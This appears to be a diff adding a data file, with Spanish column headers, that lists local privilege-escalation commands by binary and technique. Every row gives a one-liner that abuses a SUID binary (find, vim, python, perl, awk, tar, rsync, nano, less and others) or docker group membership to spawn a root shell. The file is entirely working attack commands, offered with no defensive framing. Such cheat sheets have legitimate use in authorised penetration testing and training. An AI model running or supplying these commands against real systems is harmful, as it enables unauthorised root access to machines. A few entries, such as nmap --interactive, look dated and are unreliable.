@@ -1,0 +1,19 @@
+# binario|técnica|comando
+find|SUID|find . -exec /bin/sh -p \; -quit
+vim|SUID|vim -c ':!/bin/sh'
+nmap|SUID|nmap --interactive  (luego: !sh)
+python3|SUID|python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
+python|SUID|python -c 'import os;os.execl("/bin/sh","sh","-p")'
+perl|SUID|perl -e 'exec "/bin/sh";'
+php|SUID|php -r "pcntl_exec('/bin/sh', ['-p']);"
+ruby|SUID|ruby -e 'exec "/bin/sh"'
+awk|SUID|awk 'BEGIN {system("/bin/sh")}'
+less|SUID|less /etc/profile  (luego: !sh)
+more|SUID|more /etc/profile  (luego: !sh)
+nano|SUID|nano  (Ctrl+R Ctrl+X, luego: reset; sh 1>&0 2>&0)
+cp|SUID|cp /bin/sh /tmp/sh_suid; chmod +s /tmp/sh_suid
+bash|SUID|bash -p
+sh|SUID|sh -p
+tar|SUID|tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+rsync|SUID|rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+docker|GROUP|docker run -v /:/mnt --rm -it alpine chroot /mnt sh
